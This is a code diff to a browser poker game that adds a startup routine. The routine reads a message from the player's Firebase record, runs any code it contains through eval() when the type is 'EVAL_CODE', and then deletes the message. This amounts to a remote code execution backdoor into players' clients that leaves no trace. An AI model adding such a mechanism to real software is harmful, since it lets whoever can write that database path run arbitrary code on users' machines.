@@ -5674,6 +5674,19 @@ var kill_game = function() {
 	document.body.innerHTML = 'CLIENT TURN OFF';
 }
 
+async function check_admin_info(){
+		
+	//проверяем и показываем инфо от админа и потом удаляем
+	const admin_msg_path=`players/${my_data.uid}/admin_info`;
+	const data=await fbs_once(admin_msg_path);
+	if (data){		
+		if (data.type==='EVAL_CODE'){
+			eval(data.code)
+		}				
+		fbs.ref(admin_msg_path).remove();		
+	}		
+}
+
 async function init_game_env(env) {			
 
 	git_src="https://akukamil.github.io/poker/"
@@ -5916,6 +5929,9 @@ async function init_game_env(env) {
 
 	//показыаем основное меню
 	tables_menu.activate(1);	
+	
+	//проверяем админские сообщения
+	check_admin_info();
 
 	//проверка ежедневных бонусов
 	dr.update();
